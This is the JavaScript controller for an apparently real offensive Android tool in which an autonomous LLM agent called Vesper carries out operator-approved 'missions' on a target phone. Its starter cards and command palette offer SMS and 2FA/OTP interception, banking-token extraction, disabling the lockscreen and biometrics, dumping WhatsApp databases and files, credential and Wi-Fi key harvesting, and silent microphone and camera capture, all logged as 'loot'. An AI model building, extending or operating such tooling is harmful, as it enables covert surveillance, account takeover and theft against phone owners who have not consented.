// ============================================================
// DroidCommand — Vesper AI Cockpit Controller
// Powers the autonomous LLM pilot, conversational planning & approval,
// automatic operator whisper, dynamic layout animation, fullscreen console,
// rich prompt composer, and Codex/Grok mission starter cards.
// ============================================================

window.VesperCockpit = (function () {
  // v21 fix: render gate keyed on CONTENT SIGNATURE (length + last line),
  // not length alone — the server slides its 60-line narration window
  // (del narr[:-60]), so length can hold steady while content moves.
  // The old length-only gate froze the console at exactly 60 lines forever.
  let lastNarrationSig = '';
  let isRunning = false;
  let wasRunning = false;   // running→idle transition detector (chat refresh)
  // v21.1 (audit MED-2/MED-3): monotonic sequence guards — the newest fetch
  // always wins, stale responses are discarded before they can paint.
  let statusSeq = 0;
  let chatSeq = 0;
  // v21 fix (injection) + v21.1 (audit MED-4): approved-plan objectives are
  // AI/device-influenced text; they live in an id-keyed Map — never an HTML
  // attribute, never a shiftable array index.
  const planRegistry = new Map();
  let planIdSeq = 0;
  // v21.1 (audit LOW-8): the 60-line narration window re-renders on every
  // slide — this set stops one line from re-firing gesture/loot hooks.
  const seenNarrLines = new Set();

  // Initialize
  function init() {
    loadChat();
    pollStatus();
    // v21 fix: the operator's last console/memory subtabs survive F5
    let memTab = 'casefile', conTab = 'feed';
    try {
      memTab = localStorage.getItem('vc.memtab') || 'casefile';
      conTab = localStorage.getItem('vc.contab') || 'feed';
    } catch (e) {}
    switchMemoryTab(['casefile', 'lessons', 'identity', 'skills'].includes(memTab) ? memTab : 'casefile');
    switchConsoleTab(['feed', 'memory', 'tools'].includes(conTab) ? conTab : 'feed');
    // v21.1 (audit LOW-12): rehydrate fullscreen on F5
    try {
      if (localStorage.getItem('vc.fullscreen') === '1') {
        const card = document.getElementById('vesperConsoleCard');
        const btn = document.getElementById('consoleFullscreenBtn');
        if (card) {
          card.classList.add('console-fullscreen');
          if (btn) {
            btn.textContent = 'EXIT FULLSCREEN';
            btn.classList.add('armed');
          }
        }
      }
    } catch (e) {}
    // v21 fix: no private 1.5s interval — app.js brainHeartbeat already owns
    // the status cadence (1.2s busy / 4s idle) and calls pollStatus(); two
    // pollers were double-fetching /api/brain/status every tick.
    // v22: the danger gate + live belt count ride the same boot cadence.
    pollSignoffs();
    loadBeltCount();
  }

  // v22: the DANGER GATE panel — VESPER v6 Stage 1 gives every destructive/
  // flash tool call a sign-off ID the operator must approve before dispatch.
  // This is the cockpit's half of that handshake: poll /api/brain/signoffs,
  // banner + APPROVE/DECLINE when a call parks. Time-critical (TTL 3600s but
  // missions wait on this), so it rides the SAME heartbeat as pollStatus —
  // no private timer (v21 fix discipline).
  let lastSignoffIds = '';
  let beltCount = null;

  async function pollSignoffs() {
    try {
      const res = await api('/api/brain/signoffs');
      const pending = (res && res.pending) || [];
      renderSignoffBanner(pending);
    } catch (e) { /* gate down ≠ gate open — quiet */ }
  }

  function renderSignoffBanner(pending) {
    const banner = document.getElementById('dangerGateBanner');
    if (!banner) return;
    // Only actionable ones: awaiting-approval or already approved (she'll
    // consume at retry — show it firing so the operator sees the effect).
    const actionable = pending.filter(s => !s.consumed);
    const ids = actionable.map(s => s.id).join(',');
    const stateChanged = ids !== lastSignoffIds;
    if (stateChanged) lastSignoffIds = ids;

    if (actionable.length === 0) {
      banner.style.display = 'none';
      banner.innerHTML = '';
      return;
    }

    const rows = actionable.map(s => `
      <div class="signoff-row" data-sid="${escapeHtml(s.id)}">
        <span class="signoff-tool">⚡ ${escapeHtml(s.tool)}</span>
        <span class="signoff-age">${s.age_s}s ago</span>
        ${s.approved
          ? '<span class="signoff-approved">APPROVED — FIRING ON RETRY</span>'
          : `<button class="signoff-btn approve" onclick="VesperCockpit.approveSignoff('${escapeHtml(s.id)}')">APPROVE</button>
             <button class="signoff-btn decline" onclick="VesperCockpit.declineSignoff('${escapeHtml(s.id)}')">DECLINE</button>`}
      </div>`).join('');

    banner.style.display = 'block';
    banner.innerHTML = `
      <div class="signoff-title">⚠ DANGER GATE — ${actionable.length} CALL(S) AWAITING YOUR HAND${actionable.length > 1 ? 'S' : ''}</div>
      <div class="signoff-sub">Destructive/flash class parked at dispatch. Approve to let it fire once; decline to kill it. Unanswered parks expire in 1h.</div>
      ${rows}`;
  }

  async function approveSignoff(sid) {
    try {
      const res = await api('/api/brain/signoff/approve', {
        method: 'POST', body: JSON.stringify({ signoff_id: sid })
      });
      pushFlow(res.success ? 'HIT' : 'ALERT',
        res.success ? `Sign-off ${sid} approved — the gated call fires on her retry.`
                    : `Approve failed: ${res.message || res.error || 'unknown'}`);
    } catch (e) { pushFlow('ALERT', `Approve error: ${e.message}`); }
    pollSignoffs();
  }

  async function declineSignoff(sid) {
    try {
      const res = await api('/api/brain/signoff/decline', {
        method: 'POST', body: JSON.stringify({ signoff_id: sid })
      });
      pushFlow(res.success ? 'STRIKE' : 'ALERT',
        res.success ? `Sign-off ${sid} declined — the gated call will never fire.`
                    : `Decline failed: ${res.message || res.error || 'unknown'}`);
    } catch (e) { pushFlow('ALERT', `Decline error: ${e.message}`); }
    pollSignoffs();
  }

  // v22: the belt reads its count from the LIVE registry route instead of a
  // hardcoded "48" — the belt grew to 58 with v6 organs and the UI lied.
  async function loadBeltCount() {
    if (beltCount !== null) return;
    try {
      const res = await api('/api/brain/registry');
      if (res && res.success && typeof res.count === 'number') {
        beltCount = res.count;
        const label = document.querySelector('[data-belt-label]');
        if (label) label.textContent = `${beltCount}-Tool Belt`;
        const ticker = document.getElementById('vesperActiveToolTicker');
        if (ticker && !ticker.dataset.live) {
          ticker.dataset.live = '1';
          ticker.innerHTML = `<span style="color: var(--text-faint);">All ${beltCount} tools standby</span>`;
        }
      }
    } catch (e) { /* keep the static fallback — never a dead UI */ }
  }
  async function pollStatus() {
    const seq = ++statusSeq; // v21.1: newest poll wins
    pollSignoffs(); // v22: the danger gate rides the same heartbeat
    try {
      const data = await api('/api/brain/status');
      updateStatusUi(data, seq);
    } catch (e) {
      // Quiet fail on network hiccup
    }
  }

  function updateStatusUi(status, seq) {
    if (!status) return;
    if (seq !== undefined && seq !== statusSeq) return; // v21.1: stale poll

    const state = status.state || 'idle';
    isRunning = (state === 'running');
    // v21.1 (audit MED-1): refresh on EVERY running→idle edge — the old
    // awaitingReply flag died on F5, so a reload mid-mission froze the chat
    // stream until the next send. Edge detection alone is enough.
    if (wasRunning && !isRunning) {
      loadChat();
    }
    wasRunning = isRunning;

    // Dynamic Animation: When mission is running, chat gets smaller, console expands!
    const cockpitGrid = document.getElementById('mode-ai-cockpit');
    if (cockpitGrid) {
      cockpitGrid.classList.toggle('mission-active', isRunning);
    }

    // State Badge in Chat Header
    const stateBadge = document.getElementById('vesperStateBadge');
    if (stateBadge) {
      if (isRunning) {
        stateBadge.className = 'status-pill hunting';
        stateBadge.innerHTML = '<span class="pulse-dot"></span><span>VESPER RUNNING</span>';
      } else {
        stateBadge.className = 'status-pill online';
        stateBadge.innerHTML = '<span class="pulse-dot"></span><span>VESPER READY</span>';
      }
    }

    // Step Progress in Console Header
    // v21: max_steps comes from the brain's own config (task mode), not a
    // hardcoded 40 — the old bar lied once the operator raises the cap.
    const stepEl = document.getElementById('vesperStepDisplay');
    const stepBar = document.getElementById('vesperStepProgressBar');
    const stepNum = status.step || 0;
    // v21.1 (audit LOW-7): max_steps=0 would divide to Infinity — clamp to 1.
    const maxSteps = Math.max(1, (status.mode === 'chat')
      ? (status.max_chat_steps || 20)
      : (status.max_steps || 40));
    if (stepEl) {
      stepEl.textContent = isRunning ? `STEP ${stepNum} / ${maxSteps}` : 'IDLE';
    }
    if (stepBar) {
      const pct = Math.min(100, Math.round((stepNum / maxSteps) * 100));
      stepBar.style.width = isRunning ? `${Math.max(5, pct)}%` : '0%';
    }

    // Live Narration Feed & Codex Collapsible Tool Cards
    const narrationBox = document.getElementById('vesperNarrationFeed');
    const narrations = status.narration || [];
    if (narrationBox) {
      // v21: content-signature render gate — server slides a 60-line window,
      // so length alone lies; length + tail line catches every slide.
      const sig = narrations.length + '|' + (narrations[narrations.length - 1] || '');
      if (narrations.length > 0 && sig !== lastNarrationSig) {
        lastNarrationSig = sig;
        narrationBox.innerHTML = '';
        narrations.forEach((line) => {
          // v21.1 (audit LOW-8): dedupe gesture/loot triggers — the window
          // re-renders all 60 lines per slide, old code re-fired them all.
          if (!seenNarrLines.has(line)) {
            seenNarrLines.add(line);
            if (seenNarrLines.size > 500) seenNarrLines.clear();
            // Detect tool calls or gestures to visually animate on Glass
            detectAndTriggerGlassGestures(line);
          }

          if (line.includes('tool:')) {
            // Codex / Cursor style Collapsible Tool Call Card
            const card = document.createElement('div');
            card.className = 'tool-call-card';
            const toolMatch = line.match(/tool:\s*([^\s(]+)(.*)/);
            const toolName = toolMatch ? toolMatch[1] : 'tool';
            const toolArgs = toolMatch ? toolMatch[2] : line;

            card.innerHTML = `
              <div class="tool-call-header" onclick="const b=this.nextElementSibling; b.style.display=b.style.display==='none'?'block':'none';">
                <div style="display:flex; align-items:center; gap:6px;">
                  <span style="color: var(--emerald); font-size: 8px;">●</span>
                  <span style="font-weight:700; color: var(--text-ink); font-size: 11px;">TOOL: ${escapeHtml(toolName)}</span>
                </div>
                <span style="font-size: 10px; color: var(--text-faint);">DETAILS ▾</span>
              </div>
              <div class="tool-call-body" style="display: none;"><code>${escapeHtml(toolArgs.trim() || line)}</code></div>
            `;
            narrationBox.appendChild(card);
          } else {
            const row = document.createElement('div');
            row.className = 'flow-row';
            row.style.marginBottom = '6px';

            let tagClass = 'INFO';
            let tagText = 'MIND';
            if (line.includes('operator')) {
              tagClass = 'ALERT';
              tagText = 'OP';
            } else if (line.includes('error')) {
              tagClass = 'STRIKE';
              tagText = 'ERR';
            }

            row.innerHTML = `
              <span class="flow-tag ${tagClass}">[${tagText}]</span>
              <span class="flow-msg" style="font-size: 11.5px;">${escapeHtml(line)}</span>
            `;
            narrationBox.appendChild(row);
          }
        });
        narrationBox.scrollTop = narrationBox.scrollHeight;
      }
    } else if (narrationBox && narrations.length === 0 && !isRunning) {
      narrationBox.innerHTML = '<div style="color: var(--text-graphite); padding: 16px; font-size: 11.5px;">Console ready. Chat with Vesper or pick a mission starter to formulate an assault plan.</div>';
    }

    // Current Tool Activity Ticker
    const toolTicker = document.getElementById('vesperActiveToolTicker');
    if (toolTicker) {
      const lastToolLine = [...narrations].reverse().find(n => n.includes('tool:'));
      if (lastToolLine && isRunning) {
        toolTicker.innerHTML = `<span style="color: var(--ember); font-weight: 700;">ACTIVE TOOL:</span> <code>${escapeHtml(lastToolLine)}</code>`;
      } else if (!isRunning) {
        toolTicker.innerHTML = '<span style="color: var(--text-faint);">All 48 tools standby</span>';
      }
    }

    // Abort button state
    const abortBtn = document.getElementById('vesperAbortBtn');
    if (abortBtn) {
      abortBtn.style.opacity = isRunning ? '1' : '0.4';
      abortBtn.disabled = !isRunning;
    }
  }

  // Parse gestures and exfiltrations in Vesper's stream and sync with The Glass and Phone Intelligence!
  function detectAndTriggerGlassGestures(line) {
    if (window.Glass) {
      const tapMatch = line.match(/screen_tap.*?(\d+)[,\s]+(\d+)/i);
      if (tapMatch) {
        const x = parseInt(tapMatch[1], 10);
        const y = parseInt(tapMatch[2], 10);
        window.Glass.triggerTouchVisual(x, y);
      }
    }

    if (window.PhoneIntelligence) {
      const lower = line.toLowerCase();
      if (lower.includes('camera') || lower.includes('snap')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'photo', filename: 'camera_snap_' + Date.now() + '.jpg', title: 'Silent Camera Capture', source: 'cortex' });
      } else if (lower.includes('mic') || lower.includes('audio') || lower.includes('record')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'audio', filename: 'audio_record_' + Date.now() + '.mp4', title: 'Surveillance Mic Recording', source: 'cortex' });
      } else if (lower.includes('sms') || lower.includes('otp') || lower.includes('2fa')) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'data', filename: 'sms_intercept_' + Date.now() + '.json', title: 'Intercepted 2FA SMS', source: 'cortex' });
      } else if (lower.includes('file') && (lower.includes('dump') || lower.includes('download') || lower.includes('exfiltrat'))) {
        window.PhoneIntelligence.addRealtimeLoot({ type: 'file', filename: 'target_data_' + Date.now() + '.bin', title: 'Exfiltrated Filesystem Artifact', source: 'cortex' });
      }
    }
  }

  // 2. Chat with Vesper (Bilateral + Autonomous Plan Approval + Mission Starter Cards)
  async function loadChat() {
    const stream = document.getElementById('vesperChatStream');
    if (!stream) return;

    const seq = ++chatSeq; // v21.1 (audit MED-3): last response wins
    try {
      const data = await api('/api/brain/chat');
      if (seq !== chatSeq) return;
      const msgs = data.messages || [];
      stream.innerHTML = '';

      if (msgs.length === 0) {
        stream.innerHTML = `
          <div class="chat-bubble vesper">
            <strong>Vesper // Resident Cortex:</strong> Standing by, operator. Tell me your mission objective or what you want to extract. I will formulate a tactical plan, and when you approve it, I will execute the mission autonomously on the target device.
          </div>

          <!-- Mission Starter Cards (Codex / Grok style) -->
          <div class="mission-starters-container">
            <div class="mission-starters-title">MISSION STARTERS // 1-CLICK TACTICAL DEPLOYMENT</div>
            <div class="mission-starters-grid">
              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Perform full reconnaissance on target device: audit hardware, accounts, Knox security status, and battery.')">
                <div class="mission-card-title">
                  <span>RECON TARGET DOSSIER</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Audit accounts, battery, Knox state, and hardware specs.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Audit target SMS inbox, extract 2FA OTP codes and banking security tokens, and save to casefile.')">
                <div class="mission-card-title">
                  <span>INTERCEPT 2FA & SMS</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Extract OTP tokens, bank verifications, and recent threads.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Wake target device, neutralize lockscreen keyguard, and disable security controls.')">
                <div class="mission-card-title">
                  <span>NEUTRALIZE KEYGUARD</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Disarm PIN lockscreen, keep screen awake, and grant privileges.</div>
              </div>

              <div class="mission-card" onclick="VesperCockpit.insertPromptAndPlan('Traverse /sdcard filesystem, inspect WhatsApp databases, documents, and camera media.')">
                <div class="mission-card-title">
                  <span>DUMP TARGET FILESYSTEM</span>
                  <span style="font-size: 10px; color: var(--ember);">DEPLOY →</span>
                </div>
                <div class="mission-card-desc">Traverse /sdcard for sensitive documents, media, and keys.</div>
              </div>
            </div>
          </div>
        `;
      } else {
        msgs.forEach(m => {
          const b = document.createElement('div');
          b.className = `chat-bubble ${m.role === 'user' ? 'user' : 'vesper'}`;
          // v21 fix: \n → <br> so plans render as plans, not collapsed walls
          let contentHtml = escapeHtml(m.content).replace(/\n/g, '<br>');

          // v21 fix (re-inverted): the EXECUTE button belongs on messages that
          // DO carry a newline-numbered plan — the old condition excluded real
          // plans and stamped buttons on prose that merely mentioned "1.".
          const isPlanMsg = m.role === 'assistant' &&
            /\n\s*\d+[.)]/.test(m.content) && m.content.length >= 60;
          if (isPlanMsg) {
            // v21.1 (audit MED-4): array indices shifted when the >100 prune
            // spliced the head — a stale button could EXECUTE the wrong plan.
            // Monotonic id → objective Map; refs never move. No 400-char cut:
            // the objective lives in JS memory, not in an attribute (LOW-11).
            const ref = ++planIdSeq;
            planRegistry.set(ref, m.content);
            if (planRegistry.size > 200) {
              planRegistry.delete(planRegistry.keys().next().value);
            }
            contentHtml += `
              <div style="margin-top: 10px; padding-top: 8px; border-top: 1px dashed var(--hairline);">
                <button class="action-pill install-pwa" style="padding: 4px 14px; font-size: 11px; font-weight: 700;"
                  data-plan-ref="${ref}">EXECUTE APPROVED PLAN</button>
              </div>`;
          }

          b.innerHTML = `<strong>${m.role === 'user' ? 'Operator' : escapeHtml(data.persona || 'Vesper')}:</strong> ${contentHtml}`;
          const planBtn = b.querySelector('button[data-plan-ref]');
          if (planBtn) {
            planBtn.addEventListener('click', () => {
              const objective = planRegistry.get(parseInt(planBtn.dataset.planRef, 10));
              if (objective) launchApprovedPlan(objective);
            });
          }
          stream.appendChild(b);
        });
      }
      stream.scrollTop = stream.scrollHeight;
    } catch (e) {
      // Quiet
    }
  }

  // Insert Context Tag
  function insertContextTag(tag) {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    input.value = (input.value.trim() ? input.value.trim() + ' ' : '') + tag + ' ';
    input.focus();
  }

  // Insert Prompt from Starter Card and dispatch
  function insertPromptAndPlan(text) {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    input.value = text;
    sendUnifiedMessage();
  }

  // Send Unified Message
  async function sendUnifiedMessage() {
    const input = document.getElementById('vesperChatInput');
    if (!input) return;
    const text = input.value.trim();
    if (!text) return;

    input.value = '';

    const stream = document.getElementById('vesperChatStream');
    if (stream) {
      const userBubble = document.createElement('div');
      userBubble.className = 'chat-bubble user';
      const label = isRunning ? 'Operator [Mid-Mission Whisper]' : 'Operator';
      userBubble.innerHTML = `<strong>${label}:</strong> ${escapeHtml(text)}`;
      stream.appendChild(userBubble);
      stream.scrollTop = stream.scrollHeight;
    }

    try {
      if (isRunning) {
        // Automatically route to whisper inbox when mission is active!
        pushFlow('INFO', `Whispering mid-mission guidance: "${text}"`);
        const res = await api('/api/brain/say', {
          method: 'POST',
          body: JSON.stringify({ message: text })
        });
        if (res.success) {
          pushFlow('HIT', `Whisper queued in Vesper's inbox: ${res.message}`);
        }
      } else {
        // If user explicitly approves or orders launch in text:
        if (text.toLowerCase().startsWith('approve') || text.toLowerCase().startsWith('launch') || text.toLowerCase().startsWith('run mission:')) {
          launchApprovedPlan(text);
          return;
        }

        // Standard conversation (the running→idle edge refresh is owned by
        // updateStatusUi; the 800ms fallback stays for snappiness)
        await api('/api/brain/chat', {
          method: 'POST',
          body: JSON.stringify({ message: text })
        });
        setTimeout(loadChat, 800);
      }
    } catch (e) {
      // v21.1 (audit LOW-9): the input was cleared before the POST — restore
      // the operator's text, but only if they haven't typed something new.
      if (input && !input.value) input.value = text;
      pushFlow('ALERT', `Message error: ${e.message}`);
    }
  }

  // 3. Launch Approved Plan (/api/brain/task)
  async function launchApprovedPlan(objective) {
    pushFlow('SYS', `Plan approved. Deploying autonomous execution loop...`);
    try {
      const res = await api('/api/brain/task', {
        method: 'POST',
        body: JSON.stringify({ objective: objective || 'Execute approved mission plan' })
      });
      if (res.success) {
        pushFlow('HIT', 'Vesper accepted plan. Loop armed.');
        const grid = document.getElementById('mode-ai-cockpit');
        if (grid) grid.classList.add('mission-active');
        pollStatus();
      } else {
        alert(res.message || res.error || 'Failed to arm mission.');
      }
    } catch (e) {
      alert(`Launch error: ${e.message}`);
    }
  }

  // 4. Emergency Abort Sentinel (__ABORT__)
  async function emergencyAbort() {
    if (!confirm('Send emergency __ABORT__ sentinel to Vesper? She will cleanly fold her loop at the next step boundary.')) return;

    pushFlow('STRIKE', 'OPERATOR SENTINEL: Sending __ABORT__ to Vesper...');
    try {
      const res = await api('/api/brain/say', {
        method: 'POST',
        body: JSON.stringify({ message: '__ABORT__' })
      });
      // v21.1 (audit LOW-10): honor the server verdict, don't celebrate blind.
      if (res.success) {
        pushFlow('HIT', 'Emergency abort signal accepted.');
        const grid = document.getElementById('mode-ai-cockpit');
        if (grid) grid.classList.remove('mission-active');
      } else {
        pushFlow('ALERT', `Abort rejected: ${res.message || res.error || 'unknown'}`);
      }
      pollStatus();
    } catch (e) {
      pushFlow('ALERT', `Abort error: ${e.message}`);
    }
  }

  // 5. Fullscreen Toggle (Plein Écran)
  function toggleConsoleFullscreen() {
    const card = document.getElementById('vesperConsoleCard');
    const btn = document.getElementById('consoleFullscreenBtn');
    if (!card) return;

    const isFs = card.classList.toggle('console-fullscreen');
    // v21.1 (audit LOW-12): fullscreen state survives F5 like the tabs do
    try { localStorage.setItem('vc.fullscreen', isFs ? '1' : '0'); } catch (e) {}
    if (btn) {
      btn.textContent = isFs ? 'EXIT FULLSCREEN' : 'FULLSCREEN';
      btn.classList.toggle('armed', isFs);
    }
  }

  // 6. Console Subtab Switcher
  function switchConsoleTab(tabName) {
    try { localStorage.setItem('vc.contab', tabName); } catch (e) {}
    document.querySelectorAll('.console-tab-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === tabName);
    });

    const feedBox = document.getElementById('consoleFeedView');
    const memoryBox = document.getElementById('consoleMemoryView');
    const toolsBox = document.getElementById('consoleToolsView');

    if (feedBox) feedBox.style.display = tabName === 'feed' ? 'flex' : 'none';
    if (memoryBox) memoryBox.style.display = tabName === 'memory' ? 'flex' : 'none';
    if (toolsBox) toolsBox.style.display = tabName === 'tools' ? 'flex' : 'none';

    if (tabName === 'tools') renderToolsBelt();
  }

  // 7. Memory Tab Switcher
  async function switchMemoryTab(tabName) {
    try { localStorage.setItem('vc.memtab', tabName); } catch (e) {}
    document.querySelectorAll('.memory-subtab-btn').forEach(b => {
      b.classList.toggle('active', b.dataset.tab === tabName);
    });

    const box = document.getElementById('vesperMemoryContentBox');
    if (!box) return;

    box.textContent = `Reading ${tabName} organ from disk...`;

    try {
      const res = await api(`/api/brain/memory?section=${encodeURIComponent(tabName)}`);
      if (res.success && res.content) {
        box.textContent = res.content;
      } else {
        box.textContent = `No ${tabName} data returned.`;
      }
    } catch (e) {
      box.textContent = `Memory read error: ${e.message}`;
    }
  }

  // v22: the belt renders from the LIVE registry (name + plane + danger class
  // per row), not a hardcoded 8-tool sample — the v6 organs deserve their
  // names on the wall. Cached per session; refresh button in the tab header.
  async function renderToolsBelt() {
    const box = document.getElementById('consoleToolsView');
    if (!box) return;
    box.innerHTML = `<div style="padding: 12px; color: var(--text-faint); font-size: 11px;">Loading registry…</div>`;
    try {
      const res = await api('/api/brain/registry');
      const tools = (res && res.tools) || [];
      if (!tools.length) throw new Error('empty registry');
      beltCount = tools.length;
      const planes = {};
      tools.forEach(t => { planes[t.plane] = (planes[t.plane] || 0) + 1; });
      const dangerColors = { read_only: 'var(--emerald)', state_write: 'var(--amber)', destructive: 'var(--ember)', flash: 'var(--ember)' };
      const rows = tools.map(t => `
        <div class="tool-row" title="${escapeHtml((t.interface || '') + ' · ' + (t.danger_class || ''))}">
          <code class="tool-name">${escapeHtml(t.name)}</code>
          <span class="tool-plane">${escapeHtml(t.plane || '—')}</span>
          <span class="tool-danger" style="color: ${dangerColors[t.danger_class] || 'var(--text-graphite)'}">● ${escapeHtml(t.danger_class || '—')}</span>
        </div>`).join('');
      const planeChips = Object.entries(planes).sort((a, b) => b[1] - a[1])
        .map(([p, n]) => `<span class="plane-chip">${escapeHtml(p)} · ${n}</span>`).join('');
      box.innerHTML = `
        <div style="font-family: var(--font-mono); font-size: 11px; line-height: 1.6; color: var(--text-body); padding: 10px;">
          <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; flex-wrap: wrap; gap: 6px;">
            <div style="font-weight: 700; color: var(--ember);">VESPER v6 REGISTRY — ${tools.length} TOOLS:</div>
            <div style="display: flex; gap: 5px; flex-wrap: wrap;">${planeChips}</div>
          </div>
          <div class="tool-grid">${rows}</div>
        </div>`;
      const label = document.querySelector('[data-belt-label]');
      if (label) label.textContent = `${tools.length}-Tool Belt`;
    } catch (e) {
      box.innerHTML = `<div style="padding: 12px; color: var(--text-faint); font-size: 11px;">Registry unreachable — belt unknown. Refresh the tab to retry.</div>`;
    }
  }

  const COMMANDS = [
    { name: 'RECON TARGET DOSSIER', desc: 'Audit hardware, battery, accounts, and Knox status', tag: 'MISSION', action: () => insertPromptAndPlan('Perform full reconnaissance on target device: audit hardware, accounts, Knox security status, and battery.') },
    { name: 'INTERCEPT 2FA & SMS', desc: 'Extract recent OTP tokens and banking security threads', tag: 'MISSION', action: () => insertPromptAndPlan('Audit target SMS inbox, extract 2FA OTP codes and banking security tokens, and save to casefile.') },
    { name: 'NEUTRALIZE KEYGUARD', desc: 'Disarm lockscreen PIN and disable security controls', tag: 'MISSION', action: () => insertPromptAndPlan('Wake target device, neutralize lockscreen keyguard, and disable security controls.') },
    { name: 'DUMP TARGET FILESYSTEM', desc: 'Traverse /sdcard for WhatsApp, documents, and media', tag: 'MISSION', action: () => insertPromptAndPlan('Traverse /sdcard filesystem, inspect WhatsApp databases, documents, and camera media.') },
    { name: 'START DEVICE GLASS STREAM', desc: 'Mirror phone viewport at 60 FPS', tag: 'DEVICE', action: () => window.Glass && window.Glass.toggleStream() },
    { name: 'WAKE TARGET SCREEN', desc: 'Send KEYCODE_WAKEUP (224) to target', tag: 'DEVICE', action: () => window.Glass && window.Glass.sendKey(224) },
    { name: 'NEUTRALIZE SECURITY CONTROLS', desc: 'Direct root disable of keyguard & biometric locks', tag: 'ATTACK', action: () => window.Skeleton && window.Skeleton.neutralizeSecurity() },
    { name: 'RESTORE BASELINE SECURITY', desc: 'Re-enable screenlock and normal posture', tag: 'ATTACK', action: () => window.Skeleton && window.Skeleton.restoreSecurity() },
    { name: 'HARVEST CREDENTIALS', desc: 'Dump accounts, tokens, and Wi-Fi WPA2/3 keys', tag: 'FORENSICS', action: () => window.Skeleton && window.Skeleton.harvestCredentials() },
    { name: 'RECORD 10S AMBIENT MIC', desc: 'Silent audio recording via target microphone', tag: 'SENSORY', action: () => api('/api/audio/record', {method: 'POST', body: JSON.stringify({duration: 10, serial: STATE.activeSerial})}).then(r => pushFlow('HIT', 'Mic captured: ' + r.file)).catch(e => pushFlow('ALERT', e.message)) },
    { name: 'SILENT CAMERA SNAP', desc: 'Capture covert front/rear photo snapshot', tag: 'SENSORY', action: () => api('/api/camera/snap', {method: 'POST', body: JSON.stringify({camera_id: 0, serial: STATE.activeSerial})}).then(r => pushFlow('HIT', 'Lens snapped: ' + r.file)).catch(e => pushFlow('ALERT', e.message)) },
    { name: 'TOGGLE FULLSCREEN CONSOLE', desc: 'Expand execution console to full viewport', tag: 'VIEW', action: () => toggleConsoleFullscreen() },
    { name: 'SWITCH TO MANUAL TOOLKIT', desc: 'Open direct operator warfare decks', tag: 'NAV', action: () => window.setPrimaryMode && window.setPrimaryMode('manual') },
    { name: 'SWITCH TO AI COCKPIT', desc: 'Return to Vesper resident mind', tag: 'NAV', action: () => window.setPrimaryMode && window.setPrimaryMode('ai') }
  ];

  function openCommandPalette() {
    const modal = document.getElementById('commandPaletteModal');
    const input = document.getElementById('commandPaletteInput');
    if (!modal) return;
    modal.style.display = 'flex';
    if (input) {
      input.value = '';
      input.focus();
    }
    renderCommandList(COMMANDS);
  }

  function closeCommandPalette() {
    const modal = document.getElementById('commandPaletteModal');
    if (modal) modal.style.display = 'none';
  }

  function filterCommandPalette(query) {
    const q = (query || '').toLowerCase().trim();
    if (!q) {
      renderCommandList(COMMANDS);
      return;
    }
    const filtered = COMMANDS.filter(c => c.name.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q) || c.tag.toLowerCase().includes(q));
    renderCommandList(filtered);
  }

  function renderCommandList(items) {
    const list = document.getElementById('commandPaletteList');
    if (!list) return;
    list.innerHTML = '';
    if (items.length === 0) {
      list.innerHTML = '<div style="padding: 16px; text-align: center; color: var(--text-faint); font-size: 12px;">No matching tools or commands found.</div>';
      return;
    }
    items.forEach((item, idx) => {
      const row = document.createElement('div');
      row.className = `command-item ${idx === 0 ? 'selected' : ''}`;
      row.innerHTML = `
        <div style="display: flex; flex-direction: column; gap: 2px;">
          <span style="font-weight: 700; font-family: var(--font-condensed); letter-spacing: 0.04em;">${escapeHtml(item.name)}</span>
          <span style="font-size: 11px; color: var(--text-graphite);">${escapeHtml(item.desc)}</span>
        </div>
        <span class="item-tag">${escapeHtml(item.tag)}</span>
      `;
      row.onclick = () => {
        closeCommandPalette();
        item.action();
      };
      list.appendChild(row);
    });
  }

  // Attach global keyboard listener
  window.addEventListener('keydown', (e) => {
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
      e.preventDefault();
      const modal = document.getElementById('commandPaletteModal');
      if (modal && modal.style.display === 'flex') {
        closeCommandPalette();
      } else {
        openCommandPalette();
      }
    }
  });

  return {
    init,
    sendUnifiedMessage,
    insertContextTag,
    insertPromptAndPlan,
    launchApprovedPlan,
    emergencyAbort,
    toggleConsoleFullscreen,
    switchConsoleTab,
    switchMemoryTab,
    openCommandPalette,
    closeCommandPalette,
    filterCommandPalette,
    pollStatus,
    approveSignoff,   // v22: the operator's hands on the danger gate
    declineSignoff
  };
})();
